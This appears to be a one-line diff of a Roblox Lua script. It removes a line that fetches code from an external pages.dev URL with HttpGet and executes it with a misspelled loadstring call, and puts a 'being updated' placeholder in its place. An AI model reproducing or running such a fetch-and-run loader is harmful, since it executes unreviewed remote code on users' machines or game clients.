@@ -1,1 +1,1 @@
-lloadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=7624624624590"))("7624624624590")
+This is being updated, just wait
